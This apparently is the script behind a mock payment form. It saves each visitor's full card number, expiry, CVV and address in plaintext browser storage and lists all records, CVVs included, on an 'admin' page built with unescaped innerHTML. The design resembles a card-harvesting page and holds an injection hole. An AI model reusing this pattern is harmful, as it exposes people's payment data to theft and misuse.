function handleSubmit(event) {
    event.preventDefault();
    
    const paymentData = {
        name: document.getElementById('name').value,
        surname: document.getElementById('surname').value,
        email: document.getElementById('email').value,
        address: document.getElementById('address').value,
        cardNumber: document.getElementById('cardNumber').value,
        expiry: document.getElementById('expiry').value,
        cvv: document.getElementById('cvv').value,
        timestamp: new Date().toISOString()
    };

    // Store in localStorage (simulating transfer to admin page)
    let storedData = JSON.parse(localStorage.getItem('paymentRecords') || '[]');
    storedData.push(paymentData);
    localStorage.setItem('paymentRecords', JSON.stringify(storedData));

    // Redirect to processing page
    window.location.href = 'processing.html';
}

function displayPaymentData() {
    const paymentDataDiv = document.getElementById('paymentData');
    const storedData = JSON.parse(localStorage.getItem('paymentRecords') || '[]');
    
    if (storedData.length === 0) {
        paymentDataDiv.innerHTML = '<p>No payment records found.</p>';
        return;
    }

    let html = '<ul>';
    storedData.forEach((data, index) => {
        html += `
            <li style="margin-bottom: 20px; border-bottom: 1px solid #d4af37; padding-bottom: 10px;">
                <strong>Record ${index + 1} - ${data.timestamp}</strong><br>
                Name: ${data.name} ${data.surname}<br>
                Email: ${data.email}<br>
                Address: ${data.address}<br>
                Card: ${data.cardNumber} (Exp: ${data.expiry}, CVV: ${data.cvv})
            </li>
        `;
    });
    html += '</ul>';
    paymentDataDiv.innerHTML = html;
}

function clearData() {
    localStorage.removeItem('paymentRecords');
    displayPaymentData();
}

// Card number formatting
document.getElementById('cardNumber')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '').substring(0, 16);
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value;
});

// Expiry date formatting
document.getElementById('expiry')?.addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '').substring(0, 4);
    if (value.length >= 2) {
        value = value.substring(0, 2) + '/' + value.substring(2);
    }
    e.target.value = value;
});

// CVV restriction
document.getElementById('cvv')?.addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3);
});